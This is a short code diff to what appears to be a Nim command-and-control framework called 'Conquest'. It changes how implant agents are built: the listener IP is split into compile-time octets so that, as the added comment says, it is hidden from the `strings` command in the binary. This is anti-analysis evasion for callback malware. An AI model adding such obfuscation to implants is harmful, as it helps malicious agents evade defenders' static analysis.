@@ -121,13 +121,19 @@ proc agentBuild*(cq: Conquest, listener, sleep, payload: string) =
     let listener = cq.listeners[listener.toUpperAscii] 
 
     # Create/overwrite nim.cfg file to set agent configuration 
-    let agentConfigFile = fmt"../agents/{payload}/nim.cfg"    
+    let agentConfigFile = fmt"../agents/{payload}/nim.cfg"   
+
+    # Parse IP Address and store as compile-time integer to hide hardcoded-strings in binary from `strings` command
+    let (first, second, third, fourth) = parseOctets(listener.address)
 
     # The following shows the format of the agent configuration file that defines compile-time variables 
     let config = fmt"""
     # Agent configuration 
     -d:ListenerUuid="{listener.name}"
-    -d:ListenerIp="{listener.address}"
+    -d:Octet1="{first}"
+    -d:Octet2="{second}"
+    -d:Octet3="{third}"
+    -d:Octet4="{fourth}"
     -d:ListenerPort={listener.port}
     -d:SleepDelay={sleep}
     """.replace("    ", "")
